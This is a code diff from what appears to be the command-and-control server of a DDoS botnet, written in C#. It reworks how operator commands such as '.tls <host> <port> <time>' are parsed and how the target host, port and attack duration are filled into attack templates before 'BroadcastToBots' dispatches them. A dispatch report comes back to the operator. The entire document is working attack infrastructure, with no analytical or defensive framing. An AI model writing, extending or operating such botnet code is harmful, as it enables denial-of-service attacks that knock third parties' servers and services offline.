@@ -756,24 +756,54 @@ namespace Agent
                     var args = new string[parts.Length - 1];
                     Array.Copy(parts, 1, args, 0, parts.Length - 1);
 
-                    if (args.Length < placeholders.Count)
+                    if (args.Length < 2)
                     {
-                        string usage = string.Join(" ", placeholders);
-                        channel.SendData(Encoding.UTF8.GetBytes($"\x1b[91m[-] Usage: .{method.Name} {usage}\x1b[0m\r\n"));
+                        channel.SendData(Encoding.UTF8.GetBytes($"\x1b[91m[-] Usage: .{method.Name} <host/url> <port> <time>\x1b[0m\r\n"));
                         return;
                     }
 
+                    string targetHost = args.Length > 0 ? args[0] : "N/A";
+                    string targetPort = "N/A";
+                    string attackDuration = "N/A";
+
                     string formattedCmd = method.Cmd;
-                    for (int i = 0; i < placeholders.Count; i++)
+                    bool hasPortInTemplate = placeholders.Contains("{port}");
+
+                    if (hasPortInTemplate)
                     {
-                        formattedCmd = formattedCmd.Replace(placeholders[i], args[i]);
+                        if (args.Length < 3)
+                        {
+                            channel.SendData(Encoding.UTF8.GetBytes($"\x1b[91m[-] Usage: .{method.Name} <host> <port> <time>\x1b[0m\r\n"));
+                            return;
+                        }
+                        targetPort = args[1];
+                        attackDuration = args[2];
+                        formattedCmd = formattedCmd.Replace("{host}", targetHost)
+                                                   .Replace("{port}", targetPort)
+                                                   .Replace("{time}", attackDuration);
+                    }
+                    else
+                    {
+                        // Template does not take port (e.g. ./tls {host} {time} 100)
+                        // User can supply either:
+                        // 1. <host> <port> <time> (standard 3 args)
+                        // 2. <host> <time> (2 args)
+                        if (args.Length >= 3)
+                        {
+                            targetPort = args[1];
+                            attackDuration = args[2];
+                        }
+                        else
+                        {
+                            targetPort = targetHost.StartsWith("https://", StringComparison.OrdinalIgnoreCase) ? "443" : "80";
+                            attackDuration = args[1];
+                        }
+
+                        formattedCmd = formattedCmd.Replace("{host}", targetHost)
+                                                   .Replace("{time}", attackDuration);
                     }
 
                     int dispatched = BroadcastToBots(formattedCmd);
-
-                    string targetHost = args.Length > 0 ? args[0] : "N/A";
-                    string targetPort = args.Length > 1 ? args[1] : "N/A";
-                    string attackDuration = args.Length > 2 ? args[2] : "N/A";
 
                     string response = FormatDispatchResponse(method.Name, targetHost, targetPort, attackDuration, dispatched);
                     channel.SendData(Encoding.UTF8.GetBytes(response));
